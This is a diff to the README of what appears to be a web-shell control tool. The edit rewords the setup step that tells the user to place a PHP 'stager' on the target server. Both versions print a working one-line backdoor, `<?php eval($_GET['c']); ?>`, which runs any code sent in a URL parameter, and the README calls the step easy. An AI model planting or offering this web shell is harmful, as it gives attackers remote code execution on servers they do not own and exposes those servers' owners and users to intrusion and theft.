@@ -24,8 +24,8 @@ The CLI is pretty straightforward. The commands are documented, so the user can 
 For a complete list of commands, please use `help`.  
 
 Although the interface is kinda user-friendly, you have to place the stager onto the target server.  
-Don't worry, it is as simple as placing a PHP file with the following code inside:  
-`<?php eval($_GET['c']); ?>`.  
+Don't worry, it is as simple as placing a PHP file onto the server.  
+Just place the following code inside it: `<?php eval($_GET['c']); ?>`.  
 Easy as that. 
 
 ## Release History
